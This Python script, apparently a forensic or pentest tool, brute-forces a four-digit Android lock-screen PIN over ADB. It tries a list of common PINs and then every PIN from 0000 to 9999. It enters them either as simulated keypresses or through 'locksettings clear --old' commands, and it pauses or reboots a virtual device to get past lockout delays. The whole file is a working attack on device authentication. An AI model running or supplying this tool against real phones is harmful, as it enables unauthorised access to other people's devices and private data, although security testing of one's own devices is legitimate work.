#!/usr/bin/env python3
import adbutils
import time
import sys


digit_list = (
    "1234", "1111", "0100", "1212", "7777", "1004", "2000", "4444", "2222", "6969",
    "9999", "3333", "5555", "6666", "1122", "1313", "8888", "4321", "2001", "1010")


def get_connected_devices():
    """Return all connected devices
    """
    adb = adbutils.AdbClient(host="127.0.0.1", port=5037)

    return adb


def display_connected_device():
    """Display all connected devices
    """
    adb = get_connected_devices()

    for device in adb.list():
        print(" - %s" % device.serial)


def check_device_exists(device):
    """Check if the specified device truly exists

    :param device: Device to audit
    """
    checked = False

    for element in get_connected_devices().device_list():
        if device in str(element):
            checked = True

    return checked


def show_device_info(device):
    """Display information regarding the device

    :param device: Device to audit
    """
    adb = get_connected_devices()
    d = adb.device(serial=device)

    print("[x] Getting information on %s - %s (%s)" % (device, d.prop.device, d.prop.model))


def exec_command(device, cmd):
    """Execute a specific command on the specified device

    :param device: Device to audit
    :param cmd: Commande to execute
    """
    adb = get_connected_devices()
    d = adb.device(serial=device)

    return d.shell(cmd)


def wake_screen(device):
    """ Wake Screen for GUI attacks
    :param device: Device to audit
    """
    if exec_command(device, "dumpsys power | grep 'Display Power' | cut -d'=' -f2") == "OFF":
        exec_command(device, "input keyevent 26")

    exec_command(device, "input keyevent 82")
    exec_command(device, "input swipe 407 1211 378 85")


def get_screen_status(device):
    """Get the status of the screen

    :param device: Device to audit
    """
    screen = exec_command(device, "service call trust 7 | cut -d' ' -f 3")

    return screen


def start_gui_bf(device, u_args):
    """Launch GUI bruteforce

    :param device: Device to audit
    """
    # 26 - KEYCODE_POWER
    # 66 - KEYCODE_ENTER
    # 82 - KEYCODE_MENU

    wake_screen(device)

    proc_count = 0

    if not u_args.bf:
    # COMMON DIGIT
        for pin in digit_list:
            print("Try %s" % pin)
            exec_command(device, "input text %s" % pin)
            exec_command(device, "input keyevent 66")
            exec_command(device, "input swipe 407 1211 378 85")

        
            if get_screen_status(device) == "00000000":
                sys.exit("PIN identified: %s" % pin)
        
            proc_count += 1
        

            if not u_args.virtual:
                if (proc_count % 5) == 0:
                    print("Waiting 30 secondes")
                    time.sleep(30)
                    wake_screen(device)
            else:
                if (proc_count % 4) == 0:
                    exec_command(device, "reboot")
                    time.sleep(7) # Adjust it according to the speed of the VM
                    wake_screen(device)


    # REAL BRUTE-FORCE
    for i in range(0, 10000):
        pin = '{:04d}'.format(i)

        if pin in digit_list:
            continue

        print("Try %s" % pin)
        exec_command(device, "input text %s" % pin)
        exec_command(device, "input keyevent 66")
        exec_command(device, "input swipe 407 1211 378 85")
        
        if get_screen_status(device) == "00000000":
            sys.exit("PIN identified: %s" % pin)
        
        proc_count += 1
        

        if not u_args.virtual:
            if (proc_count % 5) == 0:
                print("Waiting 30 secondes")
                time.sleep(30)
                wake_screen(device)
        else:
            if (proc_count % 4) == 0:
                exec_command(device, "reboot")
                time.sleep(7) # Adjust it according to the speed of the VM
                wake_screen(device)


def start_locksettings_bf(device, u_args):
    """Launch LockSettings bruteforce

    :param device: Device to audit
    """

    if u_args.bf is None:
        # COMMON DIGIT
        for pin in digit_list:
            print("Try %s" % pin)
            command_ret = exec_command(device, "locksettings clear --old %s" % pin)
            if "locksettings: not found" in command_ret:
                sys.exit("Locksettings not found")

            if command_ret == "Lock credential cleared":
                exec_command(device, "locksettings set-pin %s" % pin)
                sys.exit("PIN identified: %s" % pin)


    # REAL BRUTE-FORCE
    for i in range(0, 10000):
        pin = '{:04d}'.format(i)

        if pin in digit_list:
            continue

        print("Try %s" % pin)
        command_ret = exec_command(device, "locksettings clear --old %s" % pin)

        if "locksettings: not found" in command_ret:
            sys.exit("Locksettings not found")

        if command_ret == "Lock credential cleared":
            exec_command(device, "locksettings set-pin %s" % pin)
            sys.exit("PIN identified: %s" % pin)